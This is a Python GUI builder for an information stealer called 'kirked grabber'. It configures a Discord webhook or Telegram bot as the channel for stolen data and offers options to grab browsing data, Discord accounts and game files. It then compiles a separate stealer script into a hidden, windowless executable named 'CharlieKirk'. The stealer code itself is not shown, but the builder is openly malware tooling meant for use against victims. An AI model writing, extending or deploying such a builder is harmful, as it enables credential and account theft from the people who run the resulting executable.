import tkinter as tk
import os
import subprocess

CONFIG_PATH = "conf/config.py"

config = {
    "type": "discord",
    "hook": "",
    "tg_token": "",
    "tg_chat": "",
    "browsers": False,
    "discordacc": False,
    "games": False,
}



if os.path.exists(CONFIG_PATH):
    try:
        loaded = {}
        with open(CONFIG_PATH, "r", encoding="utf-8") as f:
            exec(f.read(), {}, loaded)
        for k in config:
            if k in loaded:
                config[k] = loaded[k]
    except Exception:
        pass


def applysettings():
    config["type"] = mode_var.get()
    config["hook"] = hook_input.get()
    config["tg_token"] = token_input.get()
    config["tg_chat"] = chat_input.get()
    config["browsers"] = browsers_var.get()
    config["discordacc"] = discordacc_var.get()
    config["games"] = games_var.get()

    with open(CONFIG_PATH, "w", encoding="utf-8") as f:
        for key, value in config.items():
            f.write(f"{key} = {repr(value)}\n")

    window.destroy()


def refresh_inputs():
    dc_box.pack_forget()
    tg_box.pack_forget()

    if mode_var.get() == "discord":
        dc_box.pack(fill="x", padx=10, pady=6)
    else:
        tg_box.pack(fill="x", padx=10, pady=6)


window = tk.Tk()
icon = tk.PhotoImage(file="resources/icon.png")
window.iconphoto(False, icon)
window.title("kirked grabber builder")
window.geometry("420x400")
window.resizable(False, False)

content = tk.Frame(window)
content.pack(fill="both", expand=True)

tk.Label(content, text="Type", font=("Segoe UI", 11, "bold")).pack(anchor="w", padx=10, pady=(10, 0))

mode_var = tk.StringVar(value=config["type"])

selector = tk.Frame(content)
selector.pack(anchor="w", padx=10)

tk.Radiobutton(selector, text="Discord", variable=mode_var,
               value="discord", command=refresh_inputs).pack(side="left", padx=6)

tk.Radiobutton(selector, text="Telegram", variable=mode_var,
               value="telegram", command=refresh_inputs).pack(side="left", padx=6)

dc_box = tk.Frame(content)
tk.Label(dc_box, text="Webhook URL").pack(anchor="w")
hook_input = tk.Entry(dc_box)
hook_input.insert(0, config["hook"])
hook_input.pack(fill="x")

tg_box = tk.Frame(content)
tk.Label(tg_box, text="Bot Token").pack(anchor="w")
token_input = tk.Entry(tg_box)
token_input.insert(0, config["tg_token"])
token_input.pack(fill="x")

tk.Label(tg_box, text="Chat ID").pack(anchor="w", pady=(5, 0))
chat_input = tk.Entry(tg_box)
chat_input.insert(0, config["tg_chat"])
chat_input.pack(fill="x")

tk.Label(content, text="Options", font=("Segoe UI", 11, "bold")).pack(anchor="w", padx=10, pady=(10, 0))

browsers_var = tk.BooleanVar(value=config["browsers"])
discordacc_var = tk.BooleanVar(value=config["discordacc"])
games_var = tk.BooleanVar(value=config["games"])

tk.Checkbutton(content, text="Get browsing data", variable=browsers_var).pack(anchor="w", padx=20)
tk.Checkbutton(content, text="Get discord accounts", variable=discordacc_var).pack(anchor="w", padx=20)
tk.Checkbutton(content, text="Get games", variable=games_var).pack(anchor="w", padx=20)

refresh_inputs()

bottom = tk.Frame(window)
bottom.pack(fill="x", pady=10)

tk.Button(bottom, text="Done", width=18, command=applysettings).pack()

window.mainloop()

print('Turning into an exe')
os.system('pip install -r requirements.txt')
os.system('pyinstaller --onefile --noconsole --name CharlieKirk --i NONE grvbber.py')

try:
    os.startfile('dist')
except Exception as e:

    print('Failed to open dist folder. Open it yourself. If you don\'t see any files then rerun this.') 
